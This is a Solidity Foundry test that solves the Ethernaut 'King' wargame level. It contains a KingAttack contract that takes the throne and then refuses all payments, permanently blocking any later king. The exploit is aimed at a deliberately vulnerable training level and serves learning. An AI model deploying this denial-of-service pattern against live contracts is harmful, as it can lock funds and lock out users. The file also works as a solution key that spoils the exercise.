// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {EthernautTest} from "./utils/EthernautTest.sol";
import {KingFactory} from "../src/factories/KingFactory.sol";
import {King} from "../src/levels/King.sol";

import "forge-std/console.sol";

contract KingTest is EthernautTest {
    function setUp() public override {
        super.setUp();
        KingFactory factory = new KingFactory();
        ethernaut.registerLevel(factory);
        levelAddress = ethernaut.createLevelInstance{value: 0.001 ether}(
            factory
        );
    }

    function testSolveKing() public {
        King king = King(payable(levelAddress));

        // [START]

        KingAttack attacker = new KingAttack();

        console.log("[Before] king: ", king._king());

        uint256 prize = king.prize();
        attacker.attack{value: prize + 1 wei}(payable(levelAddress));

        console.log("[After] king: ", king._king());

        vm.startPrank(makeAddr("Other User"));
        (bool success, ) = levelAddress.call{value: prize + 2 wei}("");
        console.logBool(success); // false
        vm.stopPrank();

        // [END]

        assert(ethernaut.submitLevelInstance(payable(levelAddress)));
    }
}

// Attack contract
contract KingAttack {
    function attack(address payable kingAddress) public payable {
        (bool success, ) = kingAddress.call{value: msg.value}("");
        require(success);
    }
}
